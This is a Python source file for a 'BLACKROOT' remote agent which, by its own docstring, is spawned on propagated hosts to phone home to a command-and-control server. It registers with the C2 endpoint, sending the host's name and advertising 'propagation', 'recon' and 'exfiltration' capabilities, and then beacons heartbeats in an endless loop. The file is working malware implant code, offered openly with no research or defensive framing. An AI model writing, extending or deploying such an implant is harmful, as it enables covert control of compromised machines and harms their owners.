#!/usr/bin/env python3
"""
BLACKROOT Remote Agent Bootstrap
Spawned on propagated hosts to phone-home and register with C2
"""

import json
import logging
import os
import sys
import socket
import uuid
import time
import requests
from pathlib import Path
from typing import Dict, Any, Optional

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s (%(name)s): %(message)s'
)
log = logging.getLogger("RemoteAgent")


class RemoteAgentBootstrap:
    """Bootstrap remote agent to phone-home to C2"""
    
    def __init__(self, config_path: str = "config.json"):
        self.config_path = Path(config_path)
        self.config: Dict[str, Any] = {}
        self.agent_id = f"agent-{uuid.uuid4().hex[:12]}"
        self.c2_endpoint = None
        self.session_token = None
        
    def load_config(self) -> bool:
        """Load configuration with C2 endpoint"""
        try:
            if not self.config_path.exists():
                log.error(f"❌ Config not found: {self.config_path}")
                return False
            
            with open(self.config_path, 'r') as f:
                self.config = json.load(f)
            
            # Extract C2 endpoint from config
            agent_config = self.config.get("agent", {})
            swarm_config = self.config.get("swarm", {})
            
            self.c2_endpoint = agent_config.get("c2_endpoint")
            
            # If not in agent config, build from swarm config
            if not self.c2_endpoint:
                c2_host = swarm_config.get("controller_host", "127.0.0.1")
                c2_port = swarm_config.get("controller_port", 5555)
                self.c2_endpoint = f"http://{c2_host}:{c2_port}"
            
            log.info(f"✅ Config loaded | Agent={self.agent_id} | C2={self.c2_endpoint}")
            return True
            
        except Exception as e:
            log.error(f"❌ Failed to load config: {e}")
            return False
    
    def register_with_c2(self, max_retries: int = 3) -> bool:
        """Register remote agent with C2"""
        if not self.c2_endpoint:
            log.error("❌ No C2 endpoint configured")
            return False
        
        for attempt in range(max_retries):
            try:
                # Step 1: Get challenge from C2
                challenge_url = f"{self.c2_endpoint}/auth/challenge"
                log.info(f"📡 Requesting challenge from {challenge_url}")
                
                resp = requests.post(challenge_url, timeout=5)
                resp.raise_for_status()
                challenge_data = resp.json()
                challenge = challenge_data.get("challenge")
                
                if not challenge:
                    log.warning(f"⚠️  No challenge received (attempt {attempt+1}/{max_retries})")
                    time.sleep(2 ** attempt)
                    continue
                
                log.info(f"✅ Challenge received: {challenge[:32]}...")
                
                # Step 2: Send login with agent_id and challenge (simplified)
                login_url = f"{self.c2_endpoint}/auth/login"
                login_payload = {
                    "agent_id": self.agent_id,
                    "certificate": self._get_certificate(),
                    "challenge_response": challenge,
                    "hostname": socket.gethostname(),
                    "capabilities": ["propagation", "recon", "exfiltration"]
                }
                
                log.info(f"🔐 Registering with C2: {login_url}")
                resp = requests.post(login_url, json=login_payload, timeout=5)
                resp.raise_for_status()
                
                login_data = resp.json()
                self.session_token = login_data.get("session_token")
                
                log.info(f"✅ REGISTERED WITH C2 | Agent={self.agent_id} | Token={self.session_token[:32]}...")
                return True
                
            except requests.exceptions.ConnectionError:
                log.warning(f"⚠️  C2 connection failed (attempt {attempt+1}/{max_retries}) | C2={self.c2_endpoint}")
                time.sleep(2 ** attempt)
            except requests.exceptions.Timeout:
                log.warning(f"⚠️  C2 timeout (attempt {attempt+1}/{max_retries})")
                time.sleep(2 ** attempt)
            except Exception as e:
                log.error(f"❌ Registration error: {e}")
                time.sleep(2 ** attempt)
        
        log.error(f"❌ Failed to register after {max_retries} attempts")
        return False
    
    def _get_certificate(self) -> str:
        """Generate or load agent certificate (simplified)"""
        # In Phase 1, use agent_id as placeholder
        # Phase 2 will implement proper cert generation
        return f"cert-{self.agent_id}"
    
    def send_heartbeat(self) -> bool:
        """Send heartbeat to C2"""
        if not self.session_token:
            log.warning("❌ No session token, cannot send heartbeat")
            return False
        
        try:
            heartbeat_url = f"{self.c2_endpoint}/api/agents/{self.agent_id}/heartbeat"
            payload = {
                "agent_id": self.agent_id,
                "status": "online",
                "timestamp": time.time(),
                "capabilities": ["propagation", "recon", "exfiltration"]
            }
            
            headers = {
                "Authorization": f"Bearer {self.session_token}"
            }
            
            resp = requests.post(heartbeat_url, json=payload, headers=headers, timeout=5)
            resp.raise_for_status()
            log.info(f"✅ Heartbeat sent | Agent={self.agent_id}")
            return True
            
        except Exception as e:
            log.warning(f"⚠️  Heartbeat failed: {e}")
            return False
    
    def run(self) -> bool:
        """Bootstrap sequence: load config → register → heartbeat"""
        log.info("=" * 70)
        log.info("🚀 BLACKROOT Remote Agent Bootstrap")
        log.info("=" * 70)
        
        # Step 1: Load config with C2 endpoint
        if not self.load_config():
            return False
        
        # Step 2: Register with C2 (with retries)
        if not self.register_with_c2(max_retries=5):
            log.error("❌ Failed to register with C2 - agent will run offline")
            # Continue anyway in case C2 comes online later
        
        # Step 3: Send initial heartbeat
        self.send_heartbeat()
        
        # Step 4: Keep-alive loop
        log.info("⏳ Entering keep-alive loop (send heartbeat every 30s)...")
        try:
            while True:
                time.sleep(30)
                self.send_heartbeat()
        except KeyboardInterrupt:
            log.info("🛑 Agent shutdown")
            return True


if __name__ == "__main__":
    bootstrap = RemoteAgentBootstrap(config_path="config.json")
    success = bootstrap.run()
    sys.exit(0 if success else 1)
